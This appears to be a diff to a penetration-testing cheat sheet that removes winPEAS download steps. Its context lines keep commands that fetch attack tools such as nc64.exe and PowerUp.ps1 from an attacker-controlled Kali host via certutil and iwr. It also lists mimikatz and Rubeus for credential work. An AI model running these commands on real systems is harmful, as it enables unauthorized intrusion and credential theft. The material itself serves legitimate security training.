@@ -43,13 +43,6 @@ chmod +x linpeas.sh
 ./linpeas.sh
 ```
 
-Windows target:
-
-```powershell
-iwr http://<kali-ip>:8000/winPEASx64.exe -OutFile winpeas.exe
-.\winpeas.exe
-```
-
 If PowerShell download is blocked, try `certutil`:
 
 ```cmd
@@ -59,7 +52,7 @@ certutil -urlcache -f http://<kali-ip>:8000/nc64.exe nc64.exe
 ## Fast Usage
 
 - Linux enum: `linpeas.sh`, `pspy64`
-- Windows enum: `winPEASx64.exe`, `PowerUp.ps1`, `Procmon.exe`
+- Windows enum: `PowerUp.ps1`, `Procmon.exe`
 - AD enum: `PowerView.ps1`, `Rubeus.exe`, BloodHound/SharpHound if you install them separately
 - Credential work: `mimikatz.exe`, `Rubeus.exe`, Impacket from Kali
 - Pivoting: prefer `ligolo-ng` for routed pivots; keep `chisel` for SOCKS and simple reverse tunnels
@@ -82,11 +75,6 @@ chmod +x pspy64
 ```
 
 ### Windows Enumeration
-
-```powershell
-iwr http://<kali-ip>:8000/winPEASx64.exe -OutFile winpeas.exe
-.\winpeas.exe
-```
 
 ```powershell
 iwr http://<kali-ip>:8000/PowerUp.ps1 -OutFile PowerUp.ps1
